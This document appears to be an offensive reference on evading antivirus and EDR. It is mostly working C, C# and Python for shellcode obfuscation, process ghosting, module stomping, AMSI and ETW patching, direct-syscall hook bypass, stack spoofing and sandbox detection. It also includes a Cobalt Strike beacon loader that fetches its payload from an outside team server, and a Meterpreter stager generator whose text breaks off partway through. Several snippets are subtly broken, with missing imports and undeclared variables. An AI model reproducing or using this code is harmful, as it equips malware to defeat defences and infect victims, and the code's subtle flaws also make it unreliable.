# Advanced AV Evasion Techniques Reference

## ELI5: Next-Level Hide and Seek

### The Shapeshifter Analogy

Imagine you're playing hide and seek, but you're a shapeshifter like Mystique from X-Men:
- **Basic Hiding** = Hide behind a tree (signature evasion)
- **Shapeshifting** = Transform appearance constantly (polymorphism)
- **Invisibility** = Become transparent (in-memory techniques)
- **Time Travel** = Skip forward in time (sandbox evasion)
- **Mind Control** = Make the seeker forget you exist (ETW/hook bypass)

### The Evolution of Evasion

**Generation 1: Static Evasion**
```
Change file → New signature → AV updates → Caught again
```

**Generation 2: Dynamic Evasion**
```
Change behavior → Heuristics detect → Add obfuscation → Arms race
```

**Generation 3: Living Off The Land**
```
Use legitimate tools → Hard to block → Blend with normal → Success
```

**Generation 4: In-Memory/Fileless**
```
Never touch disk → No file to scan → Execute in memory → Ghost mode
```

**Generation 5: Direct Kernel Interaction**
```
Bypass userland → Direct syscalls → Skip EDR hooks → Kernel level
```

### The Modern AV Stack (Know Your Enemy)

```
Application Layer     [Your Malware Lives Here]
        ↓
API Monitor Layer    [EDR Hooks - First Defense]
        ↓
AMSI Layer          [Script/Memory Scanning]
        ↓
ETW Layer           [Event Tracing - Telemetry]
        ↓
Minifilter Driver   [File System Monitoring]
        ↓
Kernel Callbacks    [Process/Thread/Image Notifications]
        ↓
Hypervisor         [Some EDRs Live Here Now]
```

## Automated Obfuscation Techniques

### Polymorphic Code Generation Engine

```python
#!/usr/bin/env python3
import random
import string
import base64
import hashlib

class PolymorphicEngine:
    """Advanced polymorphic code generator"""

    def __init__(self):
        self.seed = random.randint(0, 0xFFFFFFFF)
        self.mutations = {
            'variable_rename': self.mutate_variables,
            'dead_code': self.insert_dead_code,
            'control_flow': self.obfuscate_control_flow,
            'encoding': self.apply_encoding,
            'api_hash': self.hash_api_calls
        }

    def mutate_variables(self, code):
        """Replace variable names with random strings"""
        var_mapping = {}

        # Find all variables
        import re
        pattern = r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b'
        variables = set(re.findall(pattern, code))

        # Generate random replacements
        for var in variables:
            if var not in ['int', 'char', 'void', 'return', 'if', 'else', 'while']:
                random_name = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 16)))
                var_mapping[var] = random_name

        # Replace in code
        for old, new in var_mapping.items():
            code = re.sub(r'\b' + old + r'\b', new, code)

        return code

    def insert_dead_code(self, code):
        """Insert junk code that never executes"""
        dead_snippets = [
            'if (0) { int x = rand(); x = x * 2; }',
            'while (0) { break; }',
            'goto skip; int unused = 42; skip:',
            'int junk = 1; junk = junk << 32; junk = junk >> 32;'
        ]

        lines = code.split('\n')
        for _ in range(random.randint(5, 15)):
            pos = random.randint(0, len(lines))
            lines.insert(pos, random.choice(dead_snippets))

        return '\n'.join(lines)

    def obfuscate_control_flow(self, code):
        """Make control flow confusing"""
        # Add opaque predicates
        predicates = [
            '(7 * 7 - 49 == 0)',  # Always true
            '((x ^ x) == 0)',      # Always true
            '((x & 0) != 1)',      # Always true
        ]

        # Replace simple conditions
        code = code.replace('if (', f'if ({random.choice(predicates)} && ')

        # Add fake branches
        lines = code.split('\n')
        for i, line in enumerate(lines):
            if 'return' in line:
                fake = f'if ({random.choice(predicates)}) {{ {line} }} else {{ abort(); }}'
                lines[i] = fake

        return '\n'.join(lines)

    def apply_encoding(self, shellcode):
        """Multi-layer encoding for shellcode"""
        # Layer 1: XOR with random key
        xor_key = random.randint(1, 255)
        encoded = bytes([b ^ xor_key for b in shellcode])

        # Layer 2: ROT13 variation
        rot_amount = random.randint(1, 255)
        encoded = bytes([(b + rot_amount) % 256 for b in encoded])

        # Layer 3: Base64 with custom alphabet
        alphabet = list(string.ascii_letters + string.digits + '+/')
        random.shuffle(alphabet)
        custom_b64 = ''.join(alphabet)

        # Generate decoder stub
        decoder = f'''
        unsigned char* decode(unsigned char* data, int len) {{
            // Layer 3: Custom Base64 decode
            // Layer 2: Reverse ROT
            for(int i = 0; i < len; i++) {{
                data[i] = (data[i] - {rot_amount} + 256) % 256;
            }}
            // Layer 1: XOR decode
            for(int i = 0; i < len; i++) {{
                data[i] ^= {xor_key};
            }}
            return data;
        }}
        '''

        return encoded, decoder

    def hash_api_calls(self, code):
        """Replace API names with hashes"""
        api_calls = {
            'VirtualAlloc': 0x91AFCA54,
            'VirtualProtect': 0x7946CED2,
            'CreateThread': 0x4B5A8439,
            'WaitForSingleObject': 0x8E4A5F3C
        }

        hash_resolver = '''
        FARPROC ResolveAPI(DWORD hash) {
            // Walk export table and compare hashes
            HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
            // Implementation details...
            return GetProcAddress(kernel32, "resolved_name");
        }
        '''

        for api, hash_val in api_calls.items():
            code = code.replace(api, f'((typeof({api})*)ResolveAPI({hex(hash_val)}))')

        return hash_resolver + '\n' + code

# Usage example
engine = PolymorphicEngine()
original_code = '''
int main() {
    char shellcode[] = "\\x90\\x90\\x90";
    void* exec = VirtualAlloc(0, sizeof(shellcode), 0x3000, 0x40);
    memcpy(exec, shellcode, sizeof(shellcode));
    CreateThread(0, 0, exec, 0, 0, 0);
    return 0;
}
'''

mutated = engine.mutate_variables(original_code)
mutated = engine.insert_dead_code(mutated)
mutated = engine.obfuscate_control_flow(mutated)
print(mutated)
```

### Advanced String Obfuscation

```c
// Compile-time string encryption using C++14
#include <array>

template<size_t N, char KEY>
class ObfuscatedString {
private:
    std::array<char, N> encrypted;

public:
    constexpr ObfuscatedString(const char (&str)[N]) {
        for (size_t i = 0; i < N; i++) {
            encrypted[i] = str[i] ^ KEY;
        }
    }

    std::string decrypt() const {
        std::string result;
        for (size_t i = 0; i < N - 1; i++) {
            result += encrypted[i] ^ KEY;
        }
        return result;
    }
};

// Macro for easy use
#define OBFUSCATE(str) (ObfuscatedString<sizeof(str), 0x42>(str).decrypt())

// Usage
std::string api_name = OBFUSCATE("VirtualAlloc");
FARPROC pVirtualAlloc = GetProcAddress(GetModuleHandleA("kernel32.dll"), api_name.c_str());
```

### Control Flow Flattening

```c
// Transform readable code into spaghetti
int original_function(int x) {
    if (x > 10) {
        x = x * 2;
    } else {
        x = x + 5;
    }
    return x;
}

// Flattened version
int flattened_function(int x) {
    int state = 0;
    while (1) {
        switch(state) {
            case 0: // Entry
                state = (x > 10) ? 1 : 2;
                break;
            case 1: // True branch
                x = x * 2;
                state = 3;
                break;
            case 2: // False branch
                x = x + 5;
                state = 3;
                break;
            case 3: // Exit
                return x;
        }
    }
}
```

## In-Memory Execution Techniques

### Process Ghosting Implementation

```c
#include <windows.h>
#include <ktmw32.h>
#pragma comment(lib, "ktmw32.lib")

// Process Ghosting - Create process from transacted file
BOOL ProcessGhosting(LPWSTR targetPath, LPBYTE payload, DWORD payloadSize) {
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = NULL;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    // Step 1: Create transaction
    hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTransaction == INVALID_HANDLE_VALUE) return FALSE;

    // Step 2: Create transacted file
    hTransactedFile = CreateFileTransactedW(
        targetPath,
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    // Step 3: Write payload to transacted file
    DWORD written;
    WriteFile(hTransactedFile, payload, payloadSize, &written, NULL);

    // Step 4: Create section from transacted file
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );

    // Step 5: Rollback transaction (file disappears!)
    RollbackTransaction(hTransaction);
    CloseHandle(hTransactedFile);
    CloseHandle(hTransaction);

    // Step 6: Create process from section (file already gone!)
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        hSection,
        NULL,
        NULL,
        0
    );

    // Process now running from deleted file - "ghost" process!
    return TRUE;
}
```

### Module Stomping Technique

```c
// Overwrite legitimate DLL in memory
BOOL ModuleStomp(LPSTR legitimateDll, LPBYTE payload, SIZE_T payloadSize) {
    // Load legitimate DLL
    HMODULE hModule = LoadLibraryA(legitimateDll);
    if (!hModule) return FALSE;

    // Get module info
    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo));

    // Find .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    LPVOID textSection = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            textSection = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    // Make writable
    DWORD oldProtect;
    VirtualProtect(textSection, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Stomp with our payload
    memcpy(textSection, payload, min(payloadSize, textSize));

    // Restore protection
    VirtualProtect(textSection, textSize, oldProtect, &oldProtect);

    // Create thread at stomped location
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)textSection, NULL, 0, NULL);

    return TRUE;
}
```

### Advanced .NET Assembly Loading

```csharp
using System;
using System.Reflection;
using System.Runtime.InteropServices;

public class StealthLoader
{
    // Load assembly from encrypted byte array
    public static void LoadAssembly(byte[] encryptedAssembly, byte[] key)
    {
        // Decrypt in memory
        byte[] assembly = Decrypt(encryptedAssembly, key);

        // Method 1: Load into isolated AppDomain
        AppDomain domain = AppDomain.CreateDomain("Isolated");
        domain.Load(assembly);

        // Method 2: Reflection-only context (no execution yet)
        Assembly refOnly = Assembly.ReflectionOnlyLoad(assembly);

        // Method 3: Direct memory load with entry point execution
        Assembly asm = Assembly.Load(assembly);
        MethodInfo entry = asm.EntryPoint;
        entry.Invoke(null, new object[] { new string[0] });

        // Method 4: Load and execute specific method
        Type type = asm.GetType("Namespace.Class");
        MethodInfo method = type.GetMethod("Execute");
        object instance = Activator.CreateInstance(type);
        method.Invoke(instance, null);
    }

    // Bypass AMSI for .NET assemblies
    public static void DisableAMSI()
    {
        // Patch AmsiScanBuffer
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret

        var lib = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

## Direct Syscall Implementation

### Bypassing Hooked APIs with Direct Syscalls

```c
// Direct syscalls bypass EDR hooks in userland
#include <windows.h>

// Syscall numbers for Windows 10 21H2
#define NtAllocateVirtualMemory_SSN 0x18
#define NtProtectVirtualMemory_SSN  0x50
#define NtCreateThreadEx_SSN        0xC1

// Assembly syscall stub
extern "C" NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Implementation in assembly (syscall.asm)
__asm__(
    ".global NtAllocateVirtualMemory\n"
    "NtAllocateVirtualMemory:\n"
    "mov r10, rcx\n"
    "mov eax, 0x18\n"  // Syscall number
    "syscall\n"
    "ret\n"
);

// Hell's Gate technique - Dynamic syscall resolution
BOOL HellsGate(LPVOID payload, SIZE_T payloadSize) {
    // Find syscall numbers dynamically
    BYTE* ntdll = (BYTE*)GetModuleHandleA("ntdll.dll");

    // Find fresh syscall stubs
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,  // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, SSN
        0x0F, 0x05,  // syscall
        0xC3  // ret
    };

    // Search for NtAllocateVirtualMemory
    FARPROC pNtAllocate = GetProcAddress((HMODULE)ntdll, "NtAllocateVirtualMemory");

    // Extract syscall number from stub
    DWORD ssn = *(DWORD*)((BYTE*)pNtAllocate + 4);

    // Build our own syscall
    LPVOID execMem = NULL;
    SIZE_T size = payloadSize;

    // Direct syscall - no hooks!
    __asm__(
        "mov r10, rcx\n"
        "mov eax, %0\n"
        "syscall\n"
        :
        : "r"(ssn)
    );

    return TRUE;
}

// Halo's Gate - Find nearby clean syscalls
DWORD HalosGate(LPSTR functionName) {
    BYTE* pFunction = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), functionName);

    // Check if hooked
    if (pFunction[0] == 0xE9) {  // JMP instruction (hooked)
        // Search neighbors for clean syscall
        for (int i = 1; i < 500; i++) {
            // Check function above
            BYTE* above = pFunction - (i * 32);  // Approximate function size
            if (above[0] == 0x4C && above[1] == 0x8B && above[2] == 0xD1) {
                // Found clean syscall, calculate SSN
                return *(DWORD*)(above + 4) + i;
            }

            // Check function below
            BYTE* below = pFunction + (i * 32);
            if (below[0] == 0x4C && below[1] == 0x8B && below[2] == 0xD1) {
                return *(DWORD*)(below + 4) - i;
            }
        }
    }

    // Not hooked, return original
    return *(DWORD*)(pFunction + 4);
}
```

## EDR Bypass Strategies

### ETW Patching

```c
// Disable Event Tracing for Windows
BOOL DisableETW() {
    // Method 1: Patch EtwEventWrite
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

        // ret 14h - immediate return
        memcpy(pEtwEventWrite, "\xC2\x14\x00", 3);

        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    }

    // Method 2: Disable provider
    REGHANDLE hProvider = 0;
    EventRegister(&GUID_NULL, NULL, NULL, &hProvider);
    EventProviderEnabled(hProvider, 0, 0);

    return TRUE;
}

// Disable AMSI in current process
BOOL DisableAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return TRUE;  // No AMSI loaded

    // Multiple bypass methods

    // Method 1: Patch AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };  // mov eax, AMSI_RESULT_CLEAN; ret

    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    // Method 2: Corrupt context
    FARPROC pAmsiInitialize = GetProcAddress(amsi, "AmsiInitialize");
    HAMSICONTEXT amsiContext = NULL;
    ((HRESULT(*)(LPCWSTR, HAMSICONTEXT*))pAmsiInitialize)(L"Test", &amsiContext);

    // Null out context
    ZeroMemory(&amsiContext, sizeof(amsiContext));

    return TRUE;
}
```

### Kernel Callback Evasion

```c
// Bypass kernel callbacks for process/thread creation
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

// Use undocumented process creation flags
NTSTATUS StealthProcessCreate(LPWSTR targetPath) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    // Bypass callbacks with special flags
    DWORD createFlags =
        0x00000002 |  // CREATE_SUSPENDED
        0x00000004 |  // DETACHED_PROCESS
        0x00000040 |  // CREATE_PROTECTED_PROCESS
        0x00080000;   // CREATE_BREAKAWAY_FROM_JOB

    // Use NtCreateUserProcess instead of CreateProcess
    UNICODE_STRING imagePath;
    RtlInitUnicodeString(&imagePath, targetPath);

    RTL_USER_PROCESS_PARAMETERS* params;
    RtlCreateProcessParametersEx(&params, &imagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0);

    PS_CREATE_INFO createInfo = {0};
    createInfo.Size = sizeof(createInfo);
    createInfo.State = PsCreateInitialState;

    OBJECT_ATTRIBUTES objAttr = {0};
    objAttr.Length = sizeof(objAttr);

    PS_ATTRIBUTE_LIST attrList = {0};
    attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST);
    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Value = (ULONG_PTR)&imagePath;

    // Create process without triggering callbacks
    NTSTATUS status = NtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        &objAttr,
        &objAttr,
        createFlags,
        0,
        params,
        &createInfo,
        &attrList
    );

    return status;
}
```

### Thread Stack Spoofing

```c
// Hide malicious thread by spoofing call stack
BOOL SpoofCallStack(LPVOID shellcode, SIZE_T shellcodeSize) {
    // Allocate memory for shellcode
    LPVOID shellcodeAddr = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(shellcodeAddr, shellcode, shellcodeSize);
    VirtualProtect(shellcodeAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Create suspended thread with legitimate start address
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep"),
        (LPVOID)5000,  // Sleep for 5 seconds
        CREATE_SUSPENDED,
        NULL
    );

    // Get thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // Create fake stack frames
    DWORD64 fakeStack[] = {
        (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateFileW"),
        (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadFile"),
        (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle"),
        (DWORD64)shellcodeAddr  // Our shellcode at bottom
    };

    // Write fake stack
    SIZE_T written;
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)ctx.Rsp, fakeStack, sizeof(fakeStack), &written);

    // Point RIP to shellcode
    ctx.Rip = (DWORD64)shellcodeAddr;

    // Update thread context
    SetThreadContext(hThread, &ctx);

    // Resume with spoofed stack
    ResumeThread(hThread);

    return TRUE;
}
```

## Advanced Encoding Chains

### Multi-Stage Encoding Pipeline

```python
#!/usr/bin/env python3
import os
import random
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class AdvancedEncoder:
    """Multi-layer encoding with environmental keying"""

    def __init__(self):
        self.stages = []

    def encode_stage1_xor(self, shellcode):
        """Time-based XOR encoding"""
        # Use system time as part of key
        time_key = int(time.time()) & 0xFF
        key = bytes([time_key ^ 0xAA])

        encoded = bytes([b ^ key[0] for b in shellcode])

        decoder = f'''
        void decode_xor(unsigned char* buf, int len) {{
            unsigned char key = ({int(time.time())} & 0xFF) ^ 0xAA;
            for(int i = 0; i < len; i++) {{
                buf[i] ^= key;
            }}
        }}
        '''

        return encoded, decoder

    def encode_stage2_rc4(self, shellcode):
        """RC4 with environment-derived key"""
        # Derive key from environment
        username = os.environ.get('USERNAME', 'default')
        computername = os.environ.get('COMPUTERNAME', 'default')
        key = hashlib.sha256(f"{username}{computername}".encode()).digest()[:16]

        # RC4 encryption
        cipher = ARC4.new(key)
        encoded = cipher.encrypt(shellcode)

        decoder = f'''
        void decode_rc4(unsigned char* buf, int len) {{
            char* username = getenv("USERNAME");
            char* computer = getenv("COMPUTERNAME");
            unsigned char key[16];
            // SHA256 of username+computer -> key
            // RC4 decrypt with key
        }}
        '''

        return encoded, decoder

    def encode_stage3_aes(self, shellcode):
        """AES-256 with process-specific key"""
        # Use process ID and parent process ID for key
        pid = os.getpid()
        ppid = os.getppid()

        key_material = f"{pid}{ppid}".encode()
        key = hashlib.sha256(key_material).digest()

        # AES encryption
        cipher = AES.new(key, AES.MODE_CBC)
        encrypted = cipher.encrypt(pad(shellcode, AES.block_size))

        decoder = f'''
        void decode_aes(unsigned char* buf, int len) {{
            DWORD pid = GetCurrentProcessId();
            DWORD ppid = GetParentProcessId();
            // Derive AES key from PIDs
            // Decrypt with AES-256-CBC
        }}
        '''

        return cipher.iv + encrypted, decoder

    def encode_stage4_custom(self, shellcode):
        """Custom encoding with metamorphic properties"""
        # Generate random encoding algorithm
        operations = [
            lambda b, k: (b + k) & 0xFF,
            lambda b, k: (b - k) & 0xFF,
            lambda b, k: b ^ k,
            lambda b, k: ((b << 1) | (b >> 7)) & 0xFF,  # ROL
            lambda b, k: ((b >> 1) | (b << 7)) & 0xFF,  # ROR
        ]

        # Random operation sequence
        sequence = [random.choice(operations) for _ in range(4)]
        key = random.randint(1, 255)

        # Apply operations
        encoded = list(shellcode)
        for op in sequence:
            encoded = [op(b, key) for b in encoded]

        return bytes(encoded)

# Full encoding pipeline
encoder = AdvancedEncoder()
shellcode = b"\x90\x90\x90"  # Your shellcode

stage1, decoder1 = encoder.encode_stage1_xor(shellcode)
stage2, decoder2 = encoder.encode_stage2_rc4(stage1)
stage3, decoder3 = encoder.encode_stage3_aes(stage2)
final = encoder.encode_stage4_custom(stage3)

print(f"Original: {len(shellcode)} bytes")
print(f"Encoded: {len(final)} bytes")
```

## Sandbox Detection and Evasion

### Comprehensive Sandbox Detection

```c
#include <windows.h>
#include <intrin.h>

typedef struct {
    BOOL is_sandbox;
    char reason[256];
} SANDBOX_RESULT;

SANDBOX_RESULT DetectSandbox() {
    SANDBOX_RESULT result = {FALSE, ""};

    // Check 1: Timing attacks
    ULONGLONG tsc1 = __rdtsc();
    Sleep(100);
    ULONGLONG tsc2 = __rdtsc();

    if ((tsc2 - tsc1) < 100000000) {  // Too fast for 100ms
        result.is_sandbox = TRUE;
        strcpy(result.reason, "Timing acceleration detected");
        return result;
    }

    // Check 2: CPU count
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        result.is_sandbox = TRUE;
        strcpy(result.reason, "Single CPU detected");
        return result;
    }

    // Check 3: RAM check
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    if (memStatus.ullTotalPhys < (DWORDLONG)(4ULL * 1024 * 1024 * 1024)) {  // Less than 4GB
        result.is_sandbox = TRUE;
        strcpy(result.reason, "Low RAM detected");
        return result;
    }

    // Check 4: Disk size
    ULARGE_INTEGER totalBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL);

    if (totalBytes.QuadPart < (60ULL * 1024 * 1024 * 1024)) {  // Less than 60GB
        result.is_sandbox = TRUE;
        strcpy(result.reason, "Small disk detected");
        return result;
    }

    // Check 5: VM artifacts
    char* vm_files[] = {
        "C:\\windows\\system32\\drivers\\vmmouse.sys",  // VMware
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",   // VMware
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys", // VirtualBox
        "C:\\windows\\system32\\drivers\\VBoxGuest.sys", // VirtualBox
        "C:\\windows\\system32\\drivers\\vmsrvc.sys",    // Hyper-V
        NULL
    };

    for (int i = 0; vm_files[i] != NULL; i++) {
        if (GetFileAttributesA(vm_files[i]) != INVALID_FILE_ATTRIBUTES) {
            result.is_sandbox = TRUE;
            sprintf(result.reason, "VM file found: %s", vm_files[i]);
            return result;
        }
    }

    // Check 6: Registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxSF", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        result.is_sandbox = TRUE;
        strcpy(result.reason, "VirtualBox registry key found");
        return result;
    }

    // Check 7: Loaded DLLs
    if (GetModuleHandleA("sbiedll.dll")) {  // Sandboxie
        result.is_sandbox = TRUE;
        strcpy(result.reason, "Sandboxie detected");
        return result;
    }

    // Check 8: Username/Computer name
    char username[256], computername[256];
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    size = sizeof(computername);
    GetComputerNameA(computername, &size);

    char* bad_names[] = {"malware", "virus", "sandbox", "vmware", "virtualbox", "test", "analyze", NULL};
    for (int i = 0; bad_names[i] != NULL; i++) {
        if (strstr(username, bad_names[i]) || strstr(computername, bad_names[i])) {
            result.is_sandbox = TRUE;
            sprintf(result.reason, "Suspicious name: %s/%s", username, computername);
            return result;
        }
    }

    // Check 9: Debugger
    if (IsDebuggerPresent()) {
        result.is_sandbox = TRUE;
        strcpy(result.reason, "Debugger detected");
        return result;
    }

    // Check 10: Human activity
    LASTINPUTINFO lii = {sizeof(LASTINPUTINFO)};
    GetLastInputInfo(&lii);
    DWORD idle = (GetTickCount() - lii.dwTime) / 1000;

    if (idle > 600) {  // No input for 10 minutes
        result.is_sandbox = TRUE;
        strcpy(result.reason, "No human activity");
        return result;
    }

    return result;
}

// Advanced evasion based on detection
void SmartEvasion() {
    SANDBOX_RESULT detection = DetectSandbox();

    if (detection.is_sandbox) {
        // Sandbox detected - act benign
        MessageBoxA(NULL, "System Update Complete", "Windows Update", MB_OK);
        ExitProcess(0);
    } else {
        // Real system - execute payload
        ExecutePayload();
    }
}
```

## Practical Implementation Examples

### Complete Cobalt Strike Loader

```c
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

// Full Cobalt Strike beacon loader with evasion
BOOL LoadBeacon() {
    // Sandbox check first
    if (DetectSandbox().is_sandbox) {
        return FALSE;
    }

    // Disable security features
    DisableAMSI();
    DisableETW();

    // Download beacon
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"teamserver.domain.com", 443, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/download/update", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    DWORD size = 0;
    WinHttpQueryDataAvailable(hRequest, &size);

    BYTE* beacon = (BYTE*)malloc(size);
    DWORD downloaded = 0;
    WinHttpReadData(hRequest, beacon, size, &downloaded);

    // Decrypt beacon (XOR with key)
    for (int i = 0; i < size; i++) {
        beacon[i] ^= 0x42;
    }

    // Inject using direct syscalls
    HANDLE hProcess = GetCurrentProcess();
    LPVOID baseAddress = NULL;
    SIZE_T regionSize = size;

    // Direct syscall to NtAllocateVirtualMemory
    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    // Write beacon
    memcpy(baseAddress, beacon, size);

    // Change protection
    DWORD oldProtect;
    NtProtectVirtualMemory(hProcess, &baseAddress, &regionSize, PAGE_EXECUTE_READ, &oldProtect);

    // Execute with spoofed stack
    SpoofCallStack(baseAddress, size);

    return TRUE;
}
```

### Custom Meterpreter Stager

```python
#!/usr/bin/env python3
# Generate evasive Meterpreter stager

import sys
import random

def generate_stager():
    # Polymorphic stager template
    template = '''
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

// Obfuscated strings
const char* {var1} = "{server}";
const int {var2} = {port};

int main() {{
    // Anti-sandbox delay
    DWORD {var3} = GetTickCount();
    while(GetTickCount() - {var3} < {delay}) {{
        Sleep(100);
    }}

    // Connect back
    HINTERNET {var4} = InternetOpenA("{user_agent}", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET {var5} = InternetConnectA({var4}, {var1}, {var2}, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET {var6} = HttpOpenRequestA({var5}, "GET", "/{uri}", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

    HttpSendRequestA({var6}, NULL, 0, NULL, 0);

    // Download stage
    DWORD {var7} = 0;
    InternetQueryDataAvailable({var6}, &{var7}, 0, 0);

    BYTE* {var8} = (BYTE*)VirtualAlloc(NULL, {var7}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    InternetReadFile({var6}, {var8}, {var7}, &{var7});

    // Execute
    ((void(*)())({var8}))();

    return 0;
}}
'''

    # Generate random variable names
    var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(10)]

    # Fill template
    stager = template.format(
        var1=var_names[0],
        var2=var_names[1],
        var3=var_names[2],
        var4=var_names[3],
        var5=var_names[4],
        var6=var_names[5],
        var7=var_names[6],
        var8=var_names[7],
        server="192.168.1.100",
        port=443,
        delay=random.randint(5000, 15000),
        user_agent=random.choice(["Mozilla/5.0", "Chrome/91.0", "Edge/91.0"]),
